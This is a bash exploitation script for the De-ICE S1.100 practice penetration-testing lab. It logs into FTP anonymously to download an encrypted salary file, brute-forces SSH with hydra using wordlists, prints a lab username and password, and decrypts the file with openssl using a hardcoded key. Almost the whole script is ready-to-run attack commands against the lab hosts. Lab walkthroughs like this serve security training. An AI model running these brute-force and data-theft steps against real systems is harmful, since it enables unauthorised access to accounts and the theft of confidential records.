#!/bin/bash

# De-ICE S1.100 Exploitation Script
echo "=== De-ICE S1.100 Exploitation ==="
echo ""

echo "[+] Step 1: FTP Enumeration"
echo "Attempting anonymous FTP login..."
ftp -n target-ftp << 'EOF'
open target-ftp
user anonymous anonymous
binary
passive
ls
cd incoming
ls
get salary_dec2003.csv.enc
quit
EOF

if [ -f "salary_dec2003.csv.enc" ]; then
    echo "✓ Downloaded encrypted salary file!"
    mv salary_dec2003.csv.enc /root/lab/
else
    echo "✗ Could not download salary file"
fi
echo ""

echo "[+] Step 2: SSH Brute Force Attack"
if [ -f "/root/lab/users.txt" ] && [ -f "/root/lab/passwords.txt" ]; then
    echo "Running hydra against SSH service..."
    hydra -L /root/lab/users.txt -P /root/lab/passwords.txt target-ssh ssh -s 2222 -t 4
else
    echo "Run recon.sh first to generate wordlists"
fi
echo ""

echo "[+] Step 3: Manual SSH Connection"
echo "Try: ssh -p 2222 aadams@target-ssh"
echo "Password: nostaw"
echo ""

echo "[+] Step 4: Decrypt Salary File"
if [ -f "/root/lab/salary_dec2003.csv.enc" ]; then
    echo "Attempting to decrypt salary file with password 'HeadOfSecurity'..."
    openssl enc -aes-256-cbc -d -salt -in /root/lab/salary_dec2003.csv.enc -out /root/lab/salary_dec2003.csv -k "HeadOfSecurity" 2>/dev/null
    
    if [ -f "/root/lab/salary_dec2003.csv" ]; then
        echo "✓ Successfully decrypted salary file!"
        echo "Contents:"
        cat /root/lab/salary_dec2003.csv
    else
        echo "✗ Failed to decrypt - try different passwords"
    fi
else
    echo "Download the encrypted file from FTP first"
fi